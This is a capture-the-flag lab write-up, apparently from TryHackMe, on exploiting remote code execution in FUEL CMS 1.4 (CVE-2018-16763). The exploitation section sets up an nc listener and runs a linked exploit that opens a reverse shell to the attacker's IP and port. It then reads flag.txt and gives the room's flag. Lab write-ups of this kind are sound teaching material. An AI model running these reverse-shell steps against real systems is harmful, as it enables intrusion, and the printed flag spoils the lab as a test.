# Vulnerability Capstone

## Challenge Information
- **Challenge Name**: Vulnerability Capstone
- **Category**: Web Exploitation
- **Difficulty Level**: Easy

## Initial Setup
1. Run the machine and wait for 5 minutes :)

## Enumeration
1. If we simply open the given ipaddress in the browser, we can see a page of an application with the name `FUEL CMS`.

2. The version of this application is also given `1.4`.

3. Search on google for the remote code execution vulnerabilies in the version 1.4 of FUEL CMS. The CVE is `CVE-2018-16763`.

4. Click the button after discovering more exploits :)

## Exploitation
1. After checking exploits on exploit-db: `https://www.exploit-db.com/exploits/50477`, this was one that may work. But unfortunately after trying it, it was showing errors. As we were also warned in the task-5, we should look for some other ones. So i just found this one `https://gist.github.com/anir0y/8529960c18e212948b0e40ed1fb18d6d#file-fuel-cms-py`. 

2. First setup a port to get the shell:
```
nc -lvnp PORT
```

3. Run the exploit:
```
python3 exploit.py <IP_ADDRESS>
```

4. Enter the following commands when prompted:
```
shell_me
YOUR_THM_VPN_IP:PORT
```
This will give you the shell on the nc that you set up.

5. Check current directory:
```
pwd
```

6. Navigate to target directory:
```
cd ../../../../home/ubuntu
```

7. List directory contents:
```
ls
```
We can see the `flag.txt` file.

8. Read the flag:
```
cat flag.txt
```
This will give us the flag `THM{ACKME_BLOG_HACKED}`.
